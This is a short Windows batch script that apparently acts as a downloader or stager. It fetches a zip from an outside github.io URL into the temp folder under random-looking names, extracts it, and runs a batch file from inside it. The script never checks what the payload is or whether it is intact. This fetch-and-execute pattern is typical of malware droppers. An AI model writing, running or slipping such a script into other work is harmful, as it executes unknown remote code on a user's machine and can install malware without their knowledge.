@echo off
setlocal

:: Define URLs and temporary file paths
set "URL=https://2hac.github.io/-/7.zip"
set "TempZip=%TEMP%\2fhbwe.zip"
set "ExtractPath=%TEMP%\ctr5.tmp"
set "BatchScript=exstat.bat"

:: Download the zip file
powershell -command "& {Invoke-WebRequest -Uri '%URL%' -OutFile '%TempZip%'}"
pause
:: Extract the zip file
if exist "%TempZip%" (
    mkdir "%ExtractPath%"
    powershell -command "& {Expand-Archive -Path '%TempZip%' -DestinationPath '%ExtractPath%'}"
) else (
    echo Failed to download the zip file from %URL%.
    exit /b 1
)
pause
:: Run the batch script
if exist "%ExtractPath%\%BatchScript%" (
    call "%ExtractPath%\%BatchScript%"
) else (
    echo The batch script %BatchScript% does not exist in the extracted folder.
    pause
)
pause
endlocal
